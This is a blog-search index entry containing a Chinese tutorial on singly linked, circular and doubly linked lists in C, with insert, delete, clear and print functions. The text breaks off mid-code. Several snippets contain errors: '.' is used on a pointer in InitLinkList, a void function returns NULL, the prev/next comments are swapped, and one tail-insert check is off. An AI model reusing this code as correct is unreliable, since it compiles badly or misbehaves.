<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>数据结构之链表篇</title>
      <link href="/2020/07/17/34786.html"/>
      <url>/2020/07/17/34786.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>　　此篇记录一下本人对链表的理解，重点讲解链表的插入与删除算法，相信大家在学习数据结构的时候，第一篇就是链表。简直是给了我一个下马威。我对应它放弃了多次，早在1年前我就接触了链表，emmm，放弃。始终不甘心，然后等到高考暑假后再次鼓起勇气认识它，好吧，又被它打跑了。终于在前几天重新再来学习链表，功夫不负有心人，彻彻底底的搞懂了链表。<br>　　<a id="more"></a></p><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>　　链表由n个结点链组成，第一个结点的存储位置叫做头指针，最后一个结点的指针为“空”(NULL)<br>　　结点：包括数据域和指针域<br>　　头指针：指向链表中第一个结点的地址<br>　　头结点：在单链表的第一个结点前附设的一个结点<br>　　头指针是链表的必要元素，头结点是为了操作的统一和方便而设定的，其数据域一般无意义(可用来保存链表的长度)，头结点可有可无。　　</p><h3 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h3><h4 id="结构图"><a href="#结构图" class="headerlink" title="结构图"></a>结构图</h4><p>　　<img src="https://s1.ax1x.com/2020/07/16/UDUnHO.png"><br>　　再次强调，请理解头结点和头指针，头指针不是链表的第一个结点，而是指向链表的第一个结点的地址！！</p><p>　　首先定义链表的结点<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义链表的结点</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;<span class="comment">//数据域，这里为了方便示例全部采用id值</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> * <span class="title">next</span>;</span><span class="comment">//指针域，指向下一个结点的地址</span></span><br><span class="line">&#125;Node;</span><br></pre></td></tr></table></figure><br>　　然后定义链表的头结点与头指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 头结点</span></span><br><span class="line"><span class="comment">// 在定义链表时，习惯性的会定义头结点，以便统一链表结点的插入和删除操作</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LinkList</span>&#123;</span></span><br><span class="line">    Node * next;    <span class="comment">//头指针（如果链表有头结点，next就指向头结点，没有就指向第一个结点）</span></span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">&#125;LinkList;</span><br></pre></td></tr></table></figure><p>　　上面这段代码，你可能会好奇怎么使用，或者说为什么要这样定义，而不是只要有链表的结点不就完了吗，还要这段代码干嘛，别急后面会用到。</p><h4 id="单链表插入"><a href="#单链表插入" class="headerlink" title="单链表插入"></a>单链表插入</h4><p>　　插入分为两种情况，第一种插入到第一个位置，第二种插入到其他位置。<br>　　<b>第一种情况</b>：插入第一个位置<br>　<img src="https://s1.ax1x.com/2020/07/17/Uy5EPe.gif"><br>　　从图片不难看出，首先将要插入的a结点的next指向头指针，即第一个结点(a<sub>1</sub>)的地址，然后将链表的头指针指向新插入的a结点的地址，就完成了</p><p>　　<b>第二种情况</b>：插入到其他位置<br>　　这里假设插入到3位置<br>　　<img src="https://s1.ax1x.com/2020/07/16/UD27fx.gif"><br>　　让a结点的next指向a<sub>2</sub>的next，然后a<sub>2</sub>的next指向a，就完成了插入。所以，首先要找到要插入的位置的上一个结点</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在指定的位置pos插入元素id</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InsertLinkList</span><span class="params">(LinkList *linkList, <span class="keyword">int</span> pos, <span class="keyword">int</span> id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 1.创建空结点并为数据域赋值</span></span><br><span class="line">    Node *node = (Node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node)); <span class="comment">//创建结点</span></span><br><span class="line">    node-&gt;id = id;</span><br><span class="line">    node-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2.找到要插入位置的结点</span></span><br><span class="line">    <span class="comment">// 如果插入的是第一个元素</span></span><br><span class="line">    <span class="keyword">if</span> (pos == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        node-&gt;next = linkList-&gt;next;</span><br><span class="line">        linkList-&gt;next = node; <span class="comment">//重新设置头指针</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 通过循环找到要插入的结点位置</span></span><br><span class="line">        Node *prev = linkList-&gt;next; <span class="comment">// 获取到插入pos前一个结点的地址</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; pos - <span class="number">1</span> &amp;&amp; prev != <span class="literal">NULL</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            prev = prev-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.将结点插入并对接前面的结点</span></span><br><span class="line">        <span class="keyword">if</span> (prev != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//必须先让插入的结点的next获取到前一个结点的next指向的地址空间，</span></span><br><span class="line">            <span class="comment">//低下这两行代码不能调换顺序</span></span><br><span class="line">            node-&gt;next = prev-&gt;next;</span><br><span class="line">            prev-&gt;next = node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 并不需要单独考虑结点在最后添加的情况</span></span><br><span class="line">        <span class="comment">// 如果在尾部添加结点。因为在前面，就设置了node-&gt;next = NULL</span></span><br><span class="line">        <span class="comment">// 所以链表的尾结点插入好后下一个空间的地址就是空</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    linkList-&gt;length++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="单链表初始化"><a href="#单链表初始化" class="headerlink" title="单链表初始化"></a>单链表初始化</h4><p>　　定义初始化函数，此初始化只出现本篇一次，后面的双链表和循环链表将不会出现初始化示例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始化链表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitLinkList</span><span class="params">(LinkList * linkList,<span class="keyword">int</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    linkList.length = <span class="number">0</span>;   <span class="comment">//初始化链表长度</span></span><br><span class="line">    <span class="comment">//注意头指针的定义是，即使链表为空，头指针也不为空，这里是本人的代码习惯，所以将头指针设置为空</span></span><br><span class="line">    linkList.next = <span class="literal">NULL</span>;  <span class="comment">//初始头指针为空</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        InsertLinkList(linkList,i + <span class="number">1</span>,i + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="单链表删除"><a href="#单链表删除" class="headerlink" title="单链表删除"></a>单链表删除</h4><p>　　这里也要分两种情况，第一种情况:删除的位置在第一个，第二种情况:在其他位置删除<br>　　<b>第一种情况</b>:删除的位置在第一个示例<br>　　<img src="https://s1.ax1x.com/2020/07/16/UD5K6P.gif"><br>　　整个的逻辑其实是，直接让头指针指向a<sub>2</sub>即可，然后释放掉a<sub>1</sub>的内存空间即可<br>　　<br>　　<b>第二种情况</b>:在其他位置删除<br>　　假设删除的位置是2，那么需要找到上一个结点，从图片可知让a<sub>1</sub>的next指向a<sub>2</sub>的next，然后释放掉a<sub>2</sub>的空间即可<br>　　<img src="https://s1.ax1x.com/2020/07/17/Uy4UAO.gif"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在指定位置删除结点</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteLinkList</span><span class="params">(LinkList *linkList, <span class="keyword">int</span> pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 1.指向链表的第一个结点</span></span><br><span class="line">    Node *node = linkList-&gt;next;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2.删除的结点为第一个</span></span><br><span class="line">    <span class="keyword">if</span> (pos == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        linkList-&gt;next = node-&gt;next; <span class="comment">//重新设置头指针</span></span><br><span class="line">        <span class="built_in">free</span>(node); <span class="comment">//记得要使用free()，这一步容易忽略</span></span><br><span class="line">        linkList-&gt;length--;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.获取要删除的结点的前一个结点地址</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; pos - <span class="number">1</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        node = node-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    Node *delNode = node-&gt;next; <span class="comment">//要删除的结点的地址</span></span><br><span class="line">    node-&gt;next = delNode-&gt;next; <span class="comment">//重新指向地址</span></span><br><span class="line">    <span class="built_in">free</span>(delNode);</span><br><span class="line">    linkList-&gt;length--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="清空链表"><a href="#清空链表" class="headerlink" title="清空链表"></a>清空链表</h4><p>　　通过循环链表的方式，去清空链表，代码胜千言<br>　　<img src="https://s1.ax1x.com/2020/07/17/UyLrvD.gif"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 清空链表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ClearLinkList</span><span class="params">(LinkList *linkList)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Node *node = linkList-&gt;next;<span class="comment">//指向链表的第一个结点</span></span><br><span class="line">    Node *nextNode;</span><br><span class="line">    <span class="keyword">while</span> (node != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        nextNode = node-&gt;next; <span class="comment">//先记录当前结点的下一个结点以便释放当前结点的内容</span></span><br><span class="line">        <span class="built_in">free</span>(node);</span><br><span class="line">        node = nextNode;<span class="comment">//重新获取结点</span></span><br><span class="line">    &#125;</span><br><span class="line">    linkList-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    linkList-&gt;length = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="打印链表"><a href="#打印链表" class="headerlink" title="打印链表"></a>打印链表</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintLinkList</span><span class="params">(LinkList *linkList)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Node *node = linkList-&gt;next; <span class="comment">//获取到链表的第一个结点</span></span><br><span class="line">    <span class="keyword">if</span> (node == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"链表为空\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (node != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>, node-&gt;id);</span><br><span class="line">        node = node-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　main函数展示，本篇也只出现这一次，其他类型的链表main内容都大同小异</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LinkList linkList;</span><br><span class="line"></span><br><span class="line">    InitLinkList(&amp;linkList, <span class="number">4</span>);</span><br><span class="line">    PrintLinkList(&amp;linkList);</span><br><span class="line">    InsertLinkList(&amp;linkList,<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">    DeleteLinkList(&amp;linkList,<span class="number">1</span>);</span><br><span class="line">    ClearLinkList(&amp;linkList);</span><br><span class="line">    PrintLinkList(&amp;linkList);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　理解了单链表后，那么后面的循环链表和双向链表都大同小异。而从上面的代码中可看出头指针是非常重要的，用起来非常方便。</p><h3 id="循环链表"><a href="#循环链表" class="headerlink" title="循环链表"></a>循环链表</h3><h4 id="结构图-1"><a href="#结构图-1" class="headerlink" title="结构图"></a>结构图</h4><p>　　<img src="https://s1.ax1x.com/2020/07/17/UystJ0.png"><br>　　循环链表最大的特点是尾结点的指针域指向第一个结点<br>　　定义循环链表的结点</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 循环链表的结点</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CircularNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;                    <span class="comment">//数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">CircularNode</span> *<span class="title">next</span>;</span> <span class="comment">//指向下个结点的指针域</span></span><br><span class="line">&#125; CircularNode;</span><br></pre></td></tr></table></figure><p>　　定义循环链表的头结点</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 头结点</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CircularLinkList</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    CircularNode *next; <span class="comment">//指向第一个结点的指针，头指针</span></span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">&#125; CircularLinkList;</span><br></pre></td></tr></table></figure><h4 id="循环链表的插入"><a href="#循环链表的插入" class="headerlink" title="循环链表的插入"></a>循环链表的插入</h4><p>　　循环链表的插入稍微复杂了一点点，有4种情况<br>　　<b>第一种:</b>插入位置在第一个，链表长度不为0<br>　　<b>第二种:</b>插入位置在第一个，链表长度为0<br>　　<b>第三种:</b>插入位置在尾部<br>　　<b>第四种:</b>插入位置在非上述情况</p><p>　　虽然看起来要四种情况，但其实总的来说只有两大种，其他两小种只需要在里面，加一个if判断就能搞定<br>　　<b>第一种</b>:插入位置在第一个，链表长度不为0<br>　　<img src="https://s1.ax1x.com/2020/07/17/Uyfzi4.gif"><br>　　先让a结点的next指向第一个结点的地址，然后让尾结点的next指向a结点的地址，最后头指针指向a结点的地址即可<br>　　<b>第二种:</b>插入位置在第一个，链表长度为0<br>　　<img src="https://s1.ax1x.com/2020/07/18/UgdQHA.gif"><br>　　直接让头指针指向即可<br>　　<b>第三种:</b>插入位置在尾部<br>　　<img src="https://s1.ax1x.com/2020/07/18/UgB3NR.gif"><br>　　<b>第四种:</b>插入位置在非上述情况<br>　　<img src="https://s1.ax1x.com/2020/07/18/Ugrg0g.gif"><br>　　可以看到在非第一个位置插入的情况下，都需要找到前缀结点，先让a结点的next指向前缀结点的next，在让前缀结点的next指向a。如果插入的位置在最后需要更新尾结点指针域</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在循环链表指定位置插入元素</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InsertCircularLinkList</span><span class="params">(CircularLinkList *linkList, <span class="keyword">int</span> pos, <span class="keyword">int</span> id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 创建一个空节点</span></span><br><span class="line">    CircularNode *node = (CircularNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CircularNode));</span><br><span class="line">    node-&gt;id = id;</span><br><span class="line">    node-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入的位置是第一个</span></span><br><span class="line">    <span class="keyword">if</span> (pos == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        node-&gt;next = linkList-&gt;next;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果长度不为0，就要找到链表的最后一个结点</span></span><br><span class="line">        <span class="keyword">if</span> (linkList-&gt;length != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            CircularNode *lastNode = linkList-&gt;next;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; linkList-&gt;length; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                lastNode = lastNode-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 重新设置尾结点</span></span><br><span class="line">            lastNode-&gt;next = node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            node-&gt;next = node;<span class="comment">//长度为0，自己的next指向自己</span></span><br><span class="line">        &#125;</span><br><span class="line">        linkList-&gt;next = node; <span class="comment">//重新设置头结点</span></span><br><span class="line">        linkList-&gt;length++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CircularNode *currNode = linkList-&gt;next;<span class="comment">//找到要插入的上一个结点地址</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; pos - <span class="number">1</span> &amp;&amp; currNode != <span class="literal">NULL</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        currNode = currNode-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    node-&gt;next = currNode-&gt;next;</span><br><span class="line">    currNode-&gt;next = node;</span><br><span class="line">    <span class="comment">// 插入的结点在尾部</span></span><br><span class="line">    <span class="keyword">if</span> (pos == linkList-&gt;length)</span><br><span class="line">    &#123;</span><br><span class="line">        node-&gt;next = linkList-&gt;next; <span class="comment">//设置尾结点指针域</span></span><br><span class="line">    &#125;</span><br><span class="line">    linkList-&gt;length++; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="循环链表的删除"><a href="#循环链表的删除" class="headerlink" title="循环链表的删除"></a>循环链表的删除</h4><p>　　删除分为两种情况<br>　　<b>第一种:</b>在第一个位置删除<br>　　<img src="https://s1.ax1x.com/2020/07/18/Ug2Qte.gif"><br>　　先让尾结点的next指向a<sub>2</sub>，此gif下的一步应该是让头指针指向a<sub>2</sub>，为了方便演示故此顺序不一样，最后free(a<sub>1</sub>)即可</p><p>　　<b>第二种:</b>在其他位置删除<br>　　<img src="https://s1.ax1x.com/2020/07/18/UgRDUO.gif"><br>　　其实循环链表的删除和单链表的删除基本是一模一样的，无非就是多了一个更新尾结点的操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 删除循环链表中指定位置的元素</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteCircularLinkList</span><span class="params">(CircularLinkList *linkList, <span class="keyword">int</span> pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CircularNode *node = linkList-&gt;next;</span><br><span class="line">    <span class="keyword">if</span> (pos == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        CircularNode *lastNode = linkList-&gt;next; <span class="comment">//找到最后一个结点</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; linkList-&gt;length; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            lastNode = lastNode-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        lastNode-&gt;next = node-&gt;next; <span class="comment">// 重新设置尾指针</span></span><br><span class="line">        linkList-&gt;next = node-&gt;next; <span class="comment">// 重新设置头指针</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 找到要删除的结点的前一个结点</span></span><br><span class="line">        CircularNode * preNode = linkList-&gt;next;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; pos - <span class="number">1</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            preNode = preNode-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        node = preNode-&gt;next;    <span class="comment">//要删除的结点地址</span></span><br><span class="line">        preNode-&gt;next = node-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">free</span>(node);</span><br><span class="line">    linkList-&gt;length--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="循环链表的特殊遍历法"><a href="#循环链表的特殊遍历法" class="headerlink" title="循环链表的特殊遍历法"></a>循环链表的特殊遍历法</h4><p>　　通过给定的某个位置，循环遍历出链表中的每个元素<br>　　只需要先拷贝当前要位置的结点的地址，用do while循环遍历，当下一个地址不等于拷贝的地址就循环打印即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过给定的某个位置，循环遍历出链表中的每个元素</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintCircularLinkListByNode</span><span class="params">(CircularLinkList * linkList,<span class="keyword">int</span> pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CircularNode * node = linkList-&gt;next; </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(node == <span class="literal">NULL</span> || pos &lt;= <span class="number">0</span> || pos &gt; linkList-&gt;length)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//获取到pos位置的结点的地址</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; pos; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        node = node-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    CircularNode * BackupNode = node;     <span class="comment">//拷贝该结点的地址</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>,node-&gt;id);</span><br><span class="line">        node = node-&gt;next;</span><br><span class="line">    &#125;<span class="keyword">while</span>(node != BackupNode);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="双向链表"><a href="#双向链表" class="headerlink" title="双向链表"></a>双向链表</h3><p>　　双向链表只是在单链表的基础上，多了一个前缀结点，就多了一份存储空间，相当于用空间换时间</p><h4 id="结构图-2"><a href="#结构图-2" class="headerlink" title="结构图"></a>结构图</h4><p><img src="https://s1.ax1x.com/2020/07/19/URHtYR.png"><br>　　老规矩，先创建结点和头结点</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** 双向链表的结点,包含一个数据域和两个指针域 */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> * <span class="title">next</span>;</span>     <span class="comment">//指向前缀结点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> * <span class="title">prev</span>;</span>     <span class="comment">//指向后继结点</span></span><br><span class="line">&#125;Node;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 